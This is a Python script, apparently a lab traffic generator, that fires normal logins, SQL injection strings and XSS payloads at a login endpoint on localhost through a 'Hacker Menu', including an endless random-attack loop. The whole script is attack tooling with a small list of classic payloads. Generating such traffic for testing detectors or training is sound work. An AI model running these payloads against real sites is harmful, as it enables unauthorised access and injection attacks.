import requests
import time
import random

TARGET_URL = "http://127.0.0.1:8080/login"

# คลังแสง Payload
sql_payloads = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT 1,2,3 --",
    "admin' #",
    "' OR 1=1 LIMIT 1 --"
]

xss_payloads = [
    "<script>alert('pwned')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>"
]

normal_users = ["somchai", "somsri", "admin", "guest"]

def attack():
    print("\n😈 Hacker Menu:")
    print("1. Normal Login (คนดี)")
    print("2. SQL Injection Attack")
    print("3. XSS Attack")
    print("4. Auto Random Attack (รัวๆ)")
    
    choice = input("Select mode: ")

    if choice == '1':
        u = random.choice(normal_users)
        requests.get(f"{TARGET_URL}?user={u}&pass=1234")
        print("✅ Sent Normal Request")

    elif choice == '2':
        payload = random.choice(sql_payloads)
        print(f"🔥 Sending SQLi: {payload}")
        requests.get(f"{TARGET_URL}?user={payload}&pass=1234")

    elif choice == '3':
        payload = random.choice(xss_payloads)
        print(f"🔥 Sending XSS: {payload}")
        requests.get(f"{TARGET_URL}?user=admin&pass={payload}")

    elif choice == '4':
        while True:
            mode = random.choice(['normal', 'sqli', 'xss'])
            if mode == 'normal':
                u = random.choice(normal_users)
                requests.get(f"{TARGET_URL}?user={u}&pass=1234")
                print(".", end="", flush=True)
            elif mode == 'sqli':
                p = random.choice(sql_payloads)
                requests.get(f"{TARGET_URL}?user={p}&pass=1234")
                print("S", end="", flush=True)
            elif mode == 'xss':
                p = random.choice(xss_payloads)
                requests.get(f"{TARGET_URL}?user=user&pass={p}")
                print("X", end="", flush=True)
            time.sleep(1)

if __name__ == "__main__":
    while True:
        attack()